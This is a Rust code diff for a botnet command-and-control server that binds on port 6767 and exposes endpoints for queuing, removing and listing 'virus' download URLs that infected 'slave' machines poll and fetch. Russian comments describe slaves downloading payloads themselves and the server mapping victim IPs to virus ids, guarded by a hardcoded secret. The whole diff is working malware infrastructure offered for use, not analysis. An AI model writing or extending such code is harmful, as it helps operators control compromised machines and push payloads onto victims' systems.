@@ -50,7 +50,10 @@ async fn main() {
     let master = Router::new()
         .route("/poll", get(poll_handler))
         .route("/virus_add", post(virus_add_handler))
+        .route("/virus_remove", post(virus_remove_handler))
         .route("/virus_status", post(virus_status_handler))
+        .route("/pro", get(pro_handler))
+        .route("/list", get(list_handler))
         .with_state(state);
 
     let listener = tokio::net::TcpListener::bind("0.0.0.0:6767").await.unwrap();
@@ -66,6 +69,25 @@ async fn poll_handler(State(state): State<Arc<BotnetState>>) -> Json<Vec<Virus>>
     Json(que.clone())
 }
 
+// снапшот состояния: и очередь и pro
+#[derive(Serialize)]
+struct BotnetStateSnapshot {
+    que: Vec<Virus>,
+    pro: HashMap<String, u64>, // ip -> id вируса
+}
+
+async fn list_handler(State(state): State<Arc<BotnetState>>) -> Json<BotnetStateSnapshot> {
+    Json(BotnetStateSnapshot {
+        que: state.que.lock().await.clone(),
+        pro: state.pro.lock().await.clone(),
+    })
+}
+
+async fn pro_handler(State(state): State<Arc<BotnetState>>) -> Json<HashMap<String, u64>> {
+    // ip -> id вируса — чтобы slave мог найти себя в pro
+    Json(state.pro.lock().await.clone())
+}
+
 #[derive(Deserialize)]
 struct NewVirus {
     url: String,
@@ -78,6 +100,7 @@ async fn virus_add_handler(
 ) -> Result<Json<Virus>, StatusCode> {
     match body.secret.as_str() {
         // id = id последнего + 1, статус "created", out = None
+        // payload не храним — только url, качает сам slave
         "gazan67" => Ok(Json(add_virus(&state, &body.url).await)),
         _ => Err(StatusCode::UNAUTHORIZED),
     }
@@ -114,6 +137,32 @@ async fn virus_status_handler(
             }
         }
         unknown => format!("virus {}: прислал хуйню {unknown}", body.id),
+    }
+}
+
+#[derive(Deserialize)]
+struct RemoveVirus {
+    id: u64,
+    secret: String,
+}
+
+async fn virus_remove_handler(
+    State(state): State<Arc<BotnetState>>,
+    Json(body): Json<RemoveVirus>,
+) -> Result<String, StatusCode> {
+    match body.secret.as_str() {
+        // удалить вирус по id из очереди
+        "gazan67" => {
+            let mut que = state.que.lock().await;
+            match que.iter().position(|virus| virus.id == body.id) {
+                Some(index) => {
+                    que.remove(index);
+                    Ok(format!("virus {} removed", body.id))
+                }
+                None => Ok(format!("virus {} not found in que", body.id)),
+            }
+        }
+        _ => Err(StatusCode::UNAUTHORIZED),
     }
 }
 
